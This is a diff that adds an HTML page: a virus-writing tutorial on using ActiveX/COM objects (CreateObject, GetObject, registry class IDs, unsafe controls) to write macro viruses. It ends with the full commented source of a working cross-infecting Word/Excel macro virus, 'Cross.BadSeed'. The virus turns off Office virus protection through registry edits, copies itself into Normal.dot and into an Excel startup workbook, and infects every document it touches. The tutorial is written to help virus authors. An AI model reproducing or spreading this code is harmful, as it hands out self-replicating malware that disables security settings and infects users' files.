@@ -1,0 +1,267 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - ActiveX/COM Technology and Viruses</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<P align="center"> <font color="#004080"><b><font size="+3">actiVeX/COM Technology 
+  and Viruses </font><br>
+  <font size="+1">by 1nternal </font></b><br>
+  Revision 2. Fixed Sample Code. </font></P>
+<hr>
+<P> <b>Introduction </b></P>
+<P>
+Having done a bit of research into the ActiveX/COM field, and seeing many virus authors writing repetitive code, I felt it was time to write a tutorial to try and stir up some new ideas into the virus field. Although I have included some code, this is not a 'How to write a virus' tutorial, rather an 'Understanding the concept of VBA and ActiveX in relation to viruses' essay, so some previous experience in writing Macro viruses is assumed. After reading this, hopefully you should have a better understanding of ActiveX, the object model used in VB, and how we can use this to our advantage. Also, by actually understanding what you are doing, rather than just following directions, you will find yourself coming up with new ideas and improving on old ones. As you will see, the ActiveX/COM area has a lot of possibilites.
+</P>
+<P> <b>The Object Model </b></P>
+<P>
+ActiveX is really just the new name for the previous COM technology. Essentially, what it does is allow applications to create their own controls and objects for access by applications or scripts/macros, even from outside the application concerned, this is also related to OLE and essentially it all uses the same technology. There are many different scenarios where this would and could be used, often you use it without even realising it, as Microsoft is increasingly making its operating system and applications 'object orientated'. Pretty much all macros created within 
+Office applications use objects, however there are few which actually attempt to use objects other than the ones included internally by the host application, even though they are quite accessible. 
+</P><P>
+Office applications have an 'Object Browser' which is quite useful for seeing the objects available and the members of classes, it also allows the inclusion of external references, with this, you can see the objects of any type library you have installed. You will notice that that some objects contain properties/functions/constants which 'return' other objects, for example the 'Application' object of word, contains an 'ActiveDocument' property, which 'points' to a 'Document' object which is currently active. And from within the 'Document' object, there are properties and functions available to all 'Document' objects which return other objects, for example the 'PageSetup' property returns a 'PageSetup' object for that particular 'Document' object. 
+</P>
+<blockquote>
+  <PRE>
+Word -&gt; Application -&gt; Documents -&gt; Document 1     -&gt;PageSetup
+                                 -&gt; Document 2 etc -&gt;PageSetup
+</PRE>
+</blockquote>
+<P>
+
+This may seem fairly obvious, however as you start creating objects, you no longer are working with just the sub members of the host application, and an understanding of the hierarchy is important. This is just a very brief mention of objects, you should familiarise yourself with this 'object hierarchy' and the idea of objects in general, as it is an important part of using ActiveX to access objects.
+</P>
+<P> <b>CreateObject and GetObject </b></P>
+<P>
+Perhaps the reason why 'outside' objects were rarely used is because few people looked into these two functions, and they are the key to accessing objects not already available. The 'CreateObject' and 'GetObject' are members of 'VBA', however they have also been included into 'VBScript' and 'JScript' so they are also available to those languages, which has been the key to creating VBScript and JScript viruses. These two functions return an object based on a given 'class', you should install and look at the help entry for these two functions.
+</P>
+<blockquote>
+  <PRE>
+Function CreateObject(Class As String)
+Function GetObject([PathName], [Class])
+</PRE>
+</blockquote>
+<P>
+The best way to describe their use is to give an example, to create an Excel Application object from within word or VBScript, you would use something similar to:
+</P>
+<blockquote>
+  <PRE>
+Set ExcelObject = CreateObject("Excel.Application")
+</PRE>
+</blockquote>
+<P>
+The Excel object may then be accessed through the 'ExcelObject' variable. You should treat it exactly the same as you would the 'Application' object within Excel, you may continue to refer to objects within word as you normally would. For example, to find the 'Startup path' of Excel you would simply access, ExcelObject.StartupPath, or to make the application visible, you would set ExcelObject.Visible = True. A commonly used function may be to add a workbook, this would be achieved by,
+</P>
+<blockquote>
+  <PRE>
+Set CreatedWorkBook = ExcelObject.Workbooks.Add()
+</PRE>
+</blockquote>
+<P>
+The 'CreatedWorkBook' variable would then represent a 'WorkBook' object of the newly created workbook. When you are finished with the object, generally you would want to quit the new application object, this is achieved simply by calling the 'quit' function of the Excel.Application object. eg. ExcelObject.Quit(). Thats all there is to it, once you have the object created, you treat it just the same as you would if you were accessing it from within that application.
+</P><P>
+There is a little more to it however. If the application already happens to be open, or if you wish to open a file directly without knowing the class name, you would make use of the 'GetObject' function. If the application already happens to be open, then it will return the already opened application (you may still use CreateObject however, it will just open a new instance of that object if that application permits multiple instances), or if you specify a file name, it will create an instance of the application and open that particular file. This presents a bit of a problem if you wish to get an object representation of an application, but only want to create it if it isn't already open. Using CreateObject("Word.Application") will create a new instance regardless of whether its open or not, using GetObject("", "Word.Application") will do the same.
+</P><P>
+The first argument of the function is optional, and if not included, it will return the currently active application, which is what we want, however it will generate an error if it is not open. The answer is in the following code.
+</P>
+<blockquote>
+  <PRE>
+On Error Resume Next
+'Ignore the error if it cannot get the currently open application
+Set WordObj = GetObject(, "Word.Application")
+'Don't include the first argument, this will cause an error if its not open however
+If WordObj = "" then
+'check if we successfully got the object or not
+	Set WordObj = CreateObject("Word.Application")
+	'if we didn't then create it
+	QuitApp = True
+	'Set a flag that we will want to close it when we're done
+end if
+</PRE>
+</blockquote>
+<P>
+This piece of code will now get the 'Word.Application' object of either the currently active instance, or a new instance if its not already open. It will also set a flag to 'quit' the object when we are done seeing as we were responisble for creating it. Why not just create a new instance? well... it is actually quite fine to do that, however in the case of Microsoft Word, we might just like to infect 'Normal.dot', which would not be able to write to if it is already open by another instance of Word, yet this code solves that problem.
+</P>
+<P> <b>Class Names </b></P>
+<P>
+To get a list of all the class names available to your system (such as Word.Application, Excel.Application etc), take a look at the ProgID or VersionIndependentProgID keys of the classes within the CLSID key within HKEY_Classes_Root. To get the class ID of a particular application, look at the CLSID key of that particular application or object. For example, to find the CLSID of the Microsft Word application, look at the key:
+</P>
+<blockquote>
+  <PRE>
+HKEY_CLASSES_ROOT\Word.Application\CLSID
+</PRE>
+</blockquote>
+<P>
+Using the CLSID value, search the HKEY_CLASSES_ROOT\CLSID tree for the appropriate value, then use the 'VersionIndependentProgID' value to create an object of this application, which happens to be 'Word.Application'.
+</P>
+<blockquote>
+  <PRE>
+HKEY_CLASSES_ROOT\CLSID\{000209FF-0000-0000-C000-000000000046}\VersionIndependentProgID
+</PRE>
+</blockquote>
+<P>
+You will see a bunch of other keys under the class key for eah class. This information is quite useful, for example, the 'ExcelWorkSheet' class is 'automatically converted' to the 'Excel.Sheet' class, and is also treated as such. A useful key under some classes is the 'TypeLib' key, this contains the value in the 'TypeLib' section (HKEY_CLASSES_ROOT\TypeLib), search for this value in this section and you will find the type library for that class. For example, Microsoft Word's Type library can be found under:
+</P>
+<blockquote>
+  <PRE>
+HKEY_CLASSES_ROOT\TypeLib\{00020905-0000-0000-C000-000000000046}\8.0\409\win32
+</PRE>
+</blockquote>
+<P>
+which happens to be MSWord8.olb, it will usually be a DLL, EXE or OCX file, but can be a stand-alone type library file or a template, basically any type of file containing VBA objects. A type library contains all the names of the objects for the class so that it may be accessed in a language such as VBA. This is the file you should import into VBA using the Tools-References command, this will give you access to that controls' type library and you can then browse the objects in that particular type library. There are some quite interesting type libraries, particularly with IE4.
+</P><P>
+It should be noted that its also possible to create objects other than 'application' based objects, for example, instead of creating an Excel application object, then creating a chart object within the application, you can also directly create a 'Excel.Chart' object, however this places you at that point in the object hierarchy, you can still access the higher level objects such as the 'Application' object however, by using the 'parent' property.
+</P>
+<P> <b>ActiveX Controls </b></P>
+<P>
+This is where the idea of unsafe ActiveX controls comes in. You have most likely heard much talk on this topic, this is one area in which they may be exploited. A good example I can give for accessing other 'unsafe' objects is with Microsoft Word, even though it isn't marked safe for scripting, if it was, or a similar application was, it would quite a problem. It is well known that the MS Word 8.0 Object Library is capable of pretty much anything, as it is possible to drop an EXE file, this pretty much makes it possible of anything an ordinary program can do. By simply creating an Word.Application Object, you can then write and execute pretty much any macro you like at runtime. I have demonstrated this already by dropping a Word macro virus using VBScript from within a HTML page. Macros and scripts are no longer limited to the features of its host with ActiveX, they also have available all the features of any other installed classes.
+</P><P>
+Seeing as controls marked as 'safe for scripting' can be accessed online, we are no longer limited to exploiting just the browser, but also all ActiveX components that are marked safe for scripting, what these controls are capable of, either intentionally or not, is left up to the programmers of such controls. The controls are given full access to the system, and it is left up to the programmers to make them safe, if they want. As they are given full control, there is no reason why an OCX file infector cannot or has not been created, that hooks the initialisation of the control and spreads to other OCX files. As controls are designed to be shared over the internet and are executed online and are 'marked safe' whether they are or not, this could theortically cause an epidemic. However in reality, OCX files are rarely shared among users and it probably wouldn't cause much of a problem.
+</P>
+<P> <b>Some Interesting Objects: </b></P>
+<blockquote>
+  <p> Word.Application - Access everything available to Word Macros, including 
+    file access, registry access etc </p>
+  <p> Excel.Application - Access everything available to Excel macros </p>
+  <p> PowerPoint.Application - Access everything available to Powerpoint macros 
+  </p>
+  <p> Scripting.FileSystemObject - Access the file system directly </p>
+  <p> WScript.WSHShell - Access the windows scripting host shell object, including 
+    registry access, creating shortcuts etc </p>
+  <p> OfficeCompatible.Application - Access the Microsoft Office Object library 
+    including FileSearch capability </p>
+  <p> Shell.Explorer </p>
+  <p> InternetExplorer.Application </p>
+</blockquote>
+<P> <b>Commented Source </b></P>
+<P>
+I have included with this tutorial, a cross Excel/Word infector which makes use of ActiveX to 'talk' from one application to the other in order to infect both environments. It is a simplified version of my Cross.Badseed virus, with some minor improvements.
+</P>
+<PRE>
+---Source starts here----
+'&lt;!--1nternal--&gt;
+'Cross.BadSeed vT.1
+'The comments are used to identify the virus and prevent re-infection
+
+Private Sub Document_Close()
+'Hook the close event of documents within Word
+
+    On Error Resume Next
+    Options.VirusProtection = False
+    Options.ConfirmConversions = False
+    Options.SaveNormalPrompt = False
+'Disable the usual options
+
+    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
+    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
+'Set up some variables for class infection
+
+    If NT.Lines(1, 1) &lt;&gt; "'&lt;!--1nternal--&gt;" Then
+'Check if the Normal Template is infected if not then we try and infect Excel as well
+
+        NT.DeleteLines 1, NT.CountOfLines
+'Delete all exisiting lines
+
+        NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
+'Copy all lines from active document to normal template
+
+        Set xlApp = CreateObject("Excel.Application")
+'Create an Excel Applictation Object (invisible)
+
+        If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) &lt;&gt; UCase("BOOK1") Then
+'Check to see if the 'Book1' file exists in the startup directory
+'if it doesn't, then try to drop the file
+
+            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
+            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
+'Disable AV protection for Excel
+
+            Set Book1Obj = xlApp.Workbooks.Add
+'Add a new workbook to the excel applictation object
+
+            Book1Obj.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
+'Insert the virus code into the new workbook
+
+            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
+	    Book1Obj.Close
+'Save the workbook to the startup directory
+
+        End If
+        xlApp.Quit
+'Close the newly create Excel application object
+
+    End If
+    If AD.Lines(1, 1) &lt;&gt; "'&lt;!--1nternal--&gt;" Then
+        AD.DeleteLines 1, AD.CountOfLines
+        AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
+    End If
+'Check if the active document is infected, if not, infect it.
+
+End Sub
+
+Private Sub Workbook_Deactivate()
+'Hook the deactivate event of the Workbook within Excel
+
+    On Error Resume Next
+    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
+    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
+'Set up some variables for class infection
+
+    If UCase(Dir(Application.StartupPath + "\Book1.")) &lt;&gt; "BOOK1" Then
+'Check if the Book1 file exists, if not, we haven't globally infected
+
+        Set WordObj = GetObject(, "Word.Application")
+'Attempt to get the current instance of Word
+
+        If WordObj = "" Then
+            Set WordObj = CreateObject("Word.Application")
+            WQuit = True
+        End If
+'If we couldn't get the object, create a new instance of Word
+
+        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
+'Set up a variable for class infection
+
+        WordObj.Options.SaveNormalPrompt = False
+'Disable the prompt to save Normal.dot so we can do it silently
+
+        NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """"" + Chr(13) + Chr(10) + "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """"" + Chr(13) + Chr(10) + "End Sub"
+'Insert a procedure to disable Excel AV protection into the Word Template
+
+        WordObj.Run "Normal.ThisDocument.DisableAV"
+'Run the procedure within Word
+
+        NT.DeleteLines 1, NT.CountOfLines
+'Delete the procedure and any other code in the 'ThisDocument' section
+
+        NT.InsertLines 1, TW.Lines(1, TW.CountOfLines)
+'Insert the virus code into the Normal template
+
+        Set NT = Nothing
+'Clear the Normal Template variable
+
+        If WQuit = True Then WordObj.Quit
+'if we created a new instance of word, then quit it
+
+        Set xlApp = CreateObject("Excel.Application")
+'Create a new instance of Excel (so nothing is displayed and to prevent recursion)
+
+        Set Book1Obj = xlApp.Workbooks.Add
+'Add a new workbook to the object
+
+        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
+'Copy the virus code to the new workbook
+
+        Book1Obj.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
+	Book1Obj.Close
+        xlApp.Quit
+'Save the new workbook to 'Book1' in the startup directory and quit the excel object
+
+    End If
+    If AW.Lines(1, 1) &lt;&gt; "'&lt;!--1nternal--&gt;" Then
+        AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
+    End If
+'Copy the virus code into the active workbook if it isn't infected
+End Sub
+</PRE>
+<hr>
+</BODY>
+</HTML>
